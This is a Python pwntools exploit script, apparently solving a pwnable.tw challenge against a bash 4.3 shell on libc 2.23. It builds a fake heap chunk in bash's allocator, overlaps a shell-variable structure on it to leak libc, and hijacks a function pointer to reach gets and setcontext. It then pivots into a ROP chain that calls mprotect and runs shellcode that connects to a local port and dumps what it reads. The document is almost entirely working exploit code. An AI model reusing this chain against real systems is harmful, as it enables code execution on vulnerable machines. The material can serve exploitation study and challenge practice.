from pwn import *

context.arch = 'amd64'

###Structure
'''
//variable.h
typedef struct variable {
  char *name;
  char *value;
  char *exportstr;
  sh_var_value_func_t *dynamic_value;
  sh_var_assign_func_t *assign_func;
  int attribute;
  int context;
} SHELL_VAR;

//malloc.c
ISALLOC 0xf7
ISFREE 0x54
MAGIC2 0x5555

union mhead {
  bits64_t mh_align;
  struct {
    char mi_alloc;
    char mi_index;
    u_bits16_t mi_magic2;
    u_bits32_t mi_nbytes;
  } minfo;
};
'''

###Util
def run(command,recvline=False):
    r.sendlineafter('4.3$ ',command)
    if recvline is True:
        return r.recvline()

###Addr
#  libc2.23
read_got = 0x6b2288
localbuf = 0x6b7c40
bss = 0x6b9800
read_offset = 0xf7250
gets_offset = 0x6ed80

###ROPgadget
L_nop = 0x80d8
L_pop_rdi = 0x21102
L_pop_rsi = 0x202e8
L_pop_rdx = 0x1b92
L_pop_rax = 0x33544
L_pop_rbp = 0x1f930
L_syscall = 0xbc375
L_leave = 0x42351
L_setcontext = 0x47b75

###Exploit
r = remote('chall.pwnable.tw',10407)

###Pre-free a 0x30 chunk for later consumption
run(f'{"A"*0x40}={"a"*0x40}')
run(f'unset {"A"*0x40}')

###Craft fake chunk in localbuf
payload = b'a'*0x30+p64(0x30555503f7)+b'a'*0x30+p64(0x30)+p64(0)+p64(localbuf+0x38)
run(payload)

###Free fake chunk
run(f'popd +-{(localbuf+0x78)//8}')

###Consume spare 0x30 chunks
run(f'{"A"*0x40}={"a"*0x2f}')

###Allocate SHELL_VAR onto fake chunk (flush localbuf once to maintain fake chunk structure integrity)
#  variable.c new_shell_variable()
run(b'B'*0xaf+b'='+p64(0x0354)+p64(0)+b'\xfc'*0x40)

###Leak libc with variable value ptr
read_addr = u64(run(b'echo'.ljust(0x7f,b' ')+b'$'+b'B'*0xaf+b';'+p64(0x30555503f7)+p64(localbuf)+p64(read_got)+p64(0)+p64(0)+p64(0)+p64(0)+b'"',True)[:-1]+b'\x00\x00')
libc_base = read_addr-read_offset
print(hex(read_addr))
print(hex(libc_base))

###Call dynamic_value func ptr to read onto bss
run(b'echo'.ljust(0x7f,b' ')+b'$'+b'B'*0xaf+b';'+p64(0x30555503f7)+p64(localbuf)+p64(localbuf)+p64(0)+p64(libc_base+gets_offset)+p64(0)+p64(0))

frame = b'\x00'*0xa0+p64(localbuf+0x38+0xb0)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64(0)+\
           p64(libc_base+L_pop_rsi)+p64(bss)+\
           p64(libc_base+L_pop_rdx)+p64(0x400)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rbp)+p64(bss-8)+\
           p64(libc_base+L_leave)
r.sendline(frame+ROPchain)

##Call once again and stack pivot and run payload
run(b'echo'.ljust(0x7f,b' ')+b'$'+b'B'*0xaf+b';'+p64(0x30555503f7)+p64(localbuf)+p64(localbuf)+p64(0)+p64(libc_base+L_setcontext)+p64(0)+p64(0))

ROPchain = p64(libc_base+L_pop_rdi)+p64(bss&0xfffffffffffff000)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(bss+0x60)
argument = p16(2)+p16(1337)[::-1]+p32(0x100007f)+p64(0)
shellcode = asm(f'''
                 mov rdi, 2
                 mov rsi, 1
                 mov rdx, 0
                 mov rax, 41
                 syscall
                 mov r15, rax
                 mov rdi, r15
                 mov rsi, {bss+0x50}
                 mov rdx, 0x10
                 mov rax, 42
                 syscall
                 mov rdi, r15
                 mov rsi, {bss}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {bss}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 ''')
payload = ROPchain+argument+shellcode
r.send(payload)

r.interactive()
